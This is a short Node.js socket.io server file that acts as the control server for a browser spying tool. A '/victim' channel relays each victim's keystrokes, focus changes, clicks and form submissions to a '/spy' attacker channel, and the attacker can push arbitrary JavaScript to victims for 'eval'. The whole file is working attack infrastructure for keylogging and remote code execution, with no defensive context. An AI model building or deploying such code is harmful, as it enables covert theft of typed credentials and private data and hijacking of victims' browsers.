const express = require('express');
const http = require('http');
const path = require('path');

const app = express();

const { Server } = require("socket.io");

const server = http.createServer(app);
const io = new Server(server);

app.use("/", express.static(path.join(__dirname, 'public')));

server.listen(3000, () => {
    console.log('listening on *:3000');
});

const spy = io
    .of('/spy')
    .on('connection', function (socket) {
        console.log('Attacker connected.');
        socket.on('eval', function (js) {
            console.log('Remote JS:', js);
            victim.emit('eval', js);
        });

        socket.on('disconnect', function () {
            console.log('Attacker disconnected.');
        });
    });

const victim = io
    .of('/victim')
    .on('connection', function (socket) {
        console.log('Victim connected');

        socket.on('type', function (key) {
            console.log('victim/type:', key);
            spy.emit('type', key);
        });

        socket.on('focus', function (focus) {
            console.log('victim/focus:', focus);
            spy.emit('focus', focus);
        });

        socket.on('click', function (click) {
            console.log('victim/click:', click);
            spy.emit('submit', click);
        });

        socket.on('submit', function (submit) {
            console.log('victim/submit:', submit);
            spy.emit('submit', submit);
        });


        socket.on('disconnect', function () {
            console.log('Victim disconnected');
        });
    });